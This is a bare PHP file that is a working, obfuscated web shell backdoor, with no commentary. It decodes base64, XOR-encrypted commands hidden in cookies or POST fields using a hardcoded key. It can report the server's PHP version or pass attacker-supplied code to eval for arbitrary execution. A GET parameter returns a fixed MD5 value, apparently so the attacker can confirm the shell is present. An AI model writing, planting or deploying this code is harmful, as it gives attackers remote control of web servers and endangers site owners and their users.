<?php
@set_time_limit(0);
function shdp($data, $key)
{
    $out_data = "";
    for ($i = 0; $i < strlen($data);) {
        for ($j = 0; $j < strlen($key) && $i < strlen($data); $j++, $i++) {
            $out_data .= chr(ord($data[$i]) ^ ord($key[$j]));
        }
    }
    return $out_data;
}
if (isset($_GET['2035'])) {
    exit(md5('2035'));
}
$temp = array_merge($_COOKIE, $_POST);
foreach ($temp as $data_key => $data) {
    $data = json_decode(shdp(shdp(base64_decode($data), 'c0cb4bbd225f802f0ac406ddfac05106'), $data_key), true);
    if (isset($data['ak'])) {
        if ($data['a'] == 'i') {
            $i = array('pv' => @phpversion(), 'sv' => '1.0-1',);
            echo @json_encode($i);
        } elseif ($data['a'] == 'e') {
            eval($data['d']);
        }
        exit();
    }
}
